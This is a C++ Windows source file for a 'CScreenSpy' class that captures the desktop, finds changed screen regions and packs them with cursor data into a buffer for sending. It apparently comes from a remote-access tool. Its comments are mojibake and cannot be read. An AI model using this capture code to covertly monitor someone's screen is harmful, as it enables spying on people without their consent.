// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "ScreenSpy.h"
#include "until.h"

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_STEP	19
#define OFF_SET		24
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#ifdef _CONSOLE
#include <stdio.h>
#endif
CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 8;
	}
	
	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}

	m_dwBitBltRop	= SRCCOPY;

	m_bAlgorithm	= ALGORITHM_SCAN; // �q�{�ϥιj�汽�y��k
	m_dwLastCapture	= GetTickCount();
	m_nMaxFrameRate	= nMaxFrameRate;
	m_dwSleep		= 1000 / nMaxFrameRate;
	m_bIsGray		= bIsGray;
    m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);
    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);
    m_nIncSize		= 32 / m_biBitCount;

	m_nStartLine	= 0;

	m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);
	m_hDiffMemDC	= ::CreateCompatibleDC(m_hFullDC);
	m_hLineMemDC	= ::CreateCompatibleDC(NULL);
	m_hRectMemDC	= ::CreateCompatibleDC(NULL);
	m_lpvLineBits	= NULL;
	m_lpvFullBits	= NULL;

	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);

	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
	m_hDiffBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);

	::SelectObject(m_hFullMemDC, m_hFullBitmap);
	::SelectObject(m_hLineMemDC, m_hLineBitmap);
	::SelectObject(m_hDiffMemDC, m_hDiffBitmap);
	
	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);

	// �����F
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;

	m_rectBufferOffset = 0;
}

CScreenSpy::~CScreenSpy()
{
	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
	::DeleteDC(m_hLineMemDC);
	::DeleteDC(m_hFullMemDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hDiffMemDC);

	::DeleteObject(m_hLineBitmap);
	::DeleteObject(m_hFullBitmap);
	::DeleteObject(m_hDiffBitmap);

	if (m_rectBuffer)
		delete[] m_rectBuffer;
	delete[]	m_lpbmi_full;
	delete[]	m_lpbmi_line;
	delete[]	m_lpbmi_rect;
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	static LONG	nOldCursorPosY = 0;
	if (lpdwBytes == NULL || m_rectBuffer == NULL)
		return NULL;

	SelectInputWinStation();

	// ���mrect�w�İϫ��w
	m_rectBufferOffset = 0;

	// �g�J�ϥΤF���غ�k
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// �g�J���Ц�m
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
	
	// �g�J��e��������
	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// �t�������k
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// ���q���y���̹�
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
		*lpdwBytes = m_rectBufferOffset + 
			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits, m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);
		return m_rectBuffer;
	}

	// ���Ц�m�o�ܤƨåB���I�ϰ�p�G�o���ܤơA�H(�o���ܤƪ��� + DEF_STEP)�V�U���y
	// �V�W��
	int	nHotspot = max(0, CursorPos.y - DEF_STEP);
	for (
		int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine; 
		i < m_nFullHeight; 
		i += DEF_STEP
		)
	{
		if (ScanChangedRect(i))
		{
			i += DEF_STEP;
		}
	}
	nOldCursorPosY = CursorPos.y;

	m_nStartLine = (m_nStartLine + 3) % DEF_STEP;
	*lpdwBytes = m_rectBufferOffset;

	// ����o�e�V���t��
	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
		Sleep(1);
	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());

	return m_rectBuffer;
}



bool CScreenSpy::ScanChangedRect(int nStartLine)
{
	bool	bRet = false;
	LPDWORD p1, p2;
	::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
	// 0 �O�̫�@��
	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
	p2 = (PDWORD)m_lpvLineBits;
	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);

	for (int j = 0; j < m_nFullWidth; j += m_nIncSize)
	{
		if (*p1 != *p2)
		{
			if (m_changeRect.right < 0)
				m_changeRect.left = j - OFF_SET;
			m_changeRect.right = j + OFF_SET;
		}
		p1++;
		p2++;
	}
	
	if (m_changeRect.right > -1)
	{
		m_changeRect.left   = max(m_changeRect.left, 0);
		m_changeRect.top    = max(m_changeRect.top, 0);
		m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
		m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
		// �ƻs���ܪ��ϰ�
		CopyRect(&m_changeRect);
		bRet = true;
	}

	return bRet;
}
void CScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount ��1 (�¥դG���) �B4 (16 ���) �B8 (256 ���) �ɥ��C����ƫ��X�C���j�p
biBitCount ��16 (16 ����) �B24 (�u�m���, �����) �B32 (32 ����) �ɨS���C���
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	
	// 16��M�H�᪺�S���C���A������^
	if (biBitCount >= 16)
		return lpbmi;
	/*
	Windows 95�MWindows 98�G�p�GlpvBits�ѼƬ�NULL�åBGetDIBits���\�a��R�FBITMAPINFO���c�A�����^�Ȭ���Ϥ��`�@�����y�u�ơC
	
    Windows NT�G�p�GlpvBits�ѼƬ�NULL�åBGetDIBits���\�a��R�FBITMAPINFO���c�A�����^�Ȭ��D0�C�p�G��ư��楢�ѡA����N��^0�ȡCWindows NT�G�Y�Q��o��h���~�H���A�нե�callGetLastError��ơC
	*/

	HDC	hDC = GetDC(NULL);
	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // ���e���ର0
	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
	ReleaseDC(NULL, hDC);
	DeleteObject(hBmp);

	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
		}
	}

	return lpbmi;	
}

void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
{
	memcpy(m_rectBuffer + m_rectBufferOffset, lpData, nCount);
	m_rectBufferOffset += nCount;
}

LPVOID CScreenSpy::getFirstScreen()
{
	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_lpvFullBits;
}

void CScreenSpy::CopyRect( LPRECT lpRect )
{
	int	nRectWidth = lpRect->right - lpRect->left;
	int	nRectHeight = lpRect->bottom - lpRect->top;

	LPVOID	lpvRectBits = NULL;
	// �վ�m_lpbmi_rect
	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
		* m_lpbmi_rect->bmiHeader.biHeight;


	HBITMAP	hRectBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);
	::SelectObject(m_hRectMemDC, hRectBitmap);
	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
	::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));
	WriteRectBuffer((LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);

	DeleteObject(hRectBitmap);
}

UINT CScreenSpy::getFirstImageSize()
{
	return m_lpbmi_full->bmiHeader.biSizeImage;
}


void CScreenSpy::setCaptureLayer(bool bIsCaptureLayer)
{
	DWORD dwRop = SRCCOPY;
	if (bIsCaptureLayer)
		dwRop |= CAPTUREBLT;
	InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

LPBITMAPINFO CScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

bool CScreenSpy::SelectInputWinStation()
{
	bool bRet = ::SwitchInputDesktop();
	if (bRet)
	{
		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}	
	return bRet;	
}
//// ��e��J�����I
// LONG CScreenSpy::getKeyBoardHotspotY()
// {
// 	static	DWORD	dwCurrentThreadId = GetCurrentThreadId();
// 	static	HWND	hWindow = GetForegroundWindow();
// 	static	DWORD	dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 	HWND	hCurrentWindow = GetForegroundWindow();
// 	if (hCurrentWindow != hWindow )
// 	{
// 		// Release
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, FALSE);
// 		hWindow = hCurrentWindow;
// 		dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, TRUE);
// 	}
// 	
// 	POINT	pt;
// 	if (GetCaretPos(&pt))
// 	{
// 		ClientToScreen(GetFocus(), &pt);
// 	}
// 	return pt.y;	
// }

void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
{
	UINT	nJumpLine = 50;
	UINT	nJumpSleep = nJumpLine / 10; // ���y���j
	// ���y�̹�
	for (int i = 0,nToJump = 0; i < nHeight; i += nToJump)
	{
		int	nOther = nHeight - i;
		
		if (nOther > nJumpLine)
			nToJump = nJumpLine;
		else
			nToJump = nOther;
		BitBlt(hdcDest, 0, i, nWidth, nToJump, hdcSrc,	0, i, m_dwBitBltRop);
		Sleep(nJumpSleep);
	}
}

// �t�������k�������
int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
{
	// Windows�W�w�@�ӱ��y��ҥe���r�`�ƥ����O4������, �ҥH��DWORD���
	LPDWORD	p1, p2;
	p1 = (LPDWORD)lpDest;
	p2 = (LPDWORD)lpSource;

	// �����������A���P���ת�����
	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
	int nCount = 0; // �ƾڭp�ƾ�
	// p1++��ڤW�O���W�F�@��DWORD
	for (int i = 0; i < dwSize; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)
			continue;
		// �@�ӷs�ƾڶ��}�l
		// �g�J�����a�}
		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
		// �O���ƾڤj�p���s���m
		nBytesOffset = nOffsetOffset + sizeof(int);
		nDataOffset = nBytesOffset + sizeof(int);
		nCount = 0; // �ƾڭp�ƾ��k�s

		// ��sDest�����ƾ�
		*p1 = *p2;
		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;

		nCount += 4;
		i += 4, p1++, p2++;
		
		for (int j = i; j < dwSize; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;

			// ��sDest�����ƾ�
			*p1 = *p2;
			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
			nCount += 4;
		}
		// �g�J�ƾڪ���
		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
		nOffsetOffset = nDataOffset + nCount;	
	}

	// nOffsetOffset �N�O�g�J���`�j�p
	return nOffsetOffset;

//	�Pı�׽s�t���٨S��C��k�֡A�{�e�ӵ�
// 	int	Bytes = 0;
// 	__asm
// 	{
// 		mov     esi, [lpSource]
// 		mov     edi, [lpDest]
// 		mov     ebx, [lpBuffer]
// 		xor		ecx, ecx
// 		jmp		short Loop_Compare				// �}�l�i����
// Loop_Compare_Continue:
// 		mov     eax, dword ptr [esi]
// 		cmp     eax, dword ptr [edi]
// 		je      short Loop_Compare_Equal		// �p�G�۵�, �~����
// 		mov		[edi], eax						// �g�J���P���ƾڨ�ؼФ�
// 		mov     edx, ebx						// edx �O���Ĥ@�Ӥ��P�ϰ�����_�l��m
// 		mov     dword ptr [ebx], ecx
// 		add     ebx, 8
// 		mov     dword ptr [ebx], eax
// 		add     ebx, 4
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// 		jmp     short Loop_Block_Compare		// �ƾڤ��P�A���ͤ@�Ӱ϶��A��o�Ӱ϶��i����
// Loop_Block_Compare_Continue:	
// 		mov     eax, dword ptr [esi]
// 		cmp     eax, dword ptr [edi]
// 		jnz     short Loop_Block_Compare_Not_Equal // �ƾڤ��۵��A�g�J
// 		mov     eax, ecx
// 		sub     eax, dword ptr [edx]
// 		add     edx, 4
// 		mov     dword ptr [edx], eax
// 		add     eax, 8
// 		add     [Bytes], eax
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// 		jmp     short Loop_Block_Compare_Finish
// Loop_Block_Compare_Not_Equal:	
// 		mov     dword ptr [ebx], eax
// 		mov		[edi], eax					// �g�J���P���ƾڨ�ؼФ�
// 		add     ebx, 4
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// Loop_Block_Compare:
// 		cmp     ecx, [dwSize]
// 		jb      short Loop_Block_Compare_Continue
// Loop_Block_Compare_Finish:
// 		cmp     ecx, [dwSize]
// 		jnz     short Loop_Compare
// 		mov     eax, ecx
// 		sub     eax, dword ptr [edx]
// 		add     edx, 4
// 		mov     dword ptr [edx], eax
// 		add     eax, 8
// 		add     [Bytes], eax
// 		jmp     short Loop_Compare
// Loop_Compare_Equal:
// 		add     esi, 4
// 		add     edi, 4
// 		add     ecx, 4
// Loop_Compare:
// 		cmp     ecx, [dwSize]
// 		jb      short Loop_Compare_Continue
// 	}
// 	return Bytes;	
}
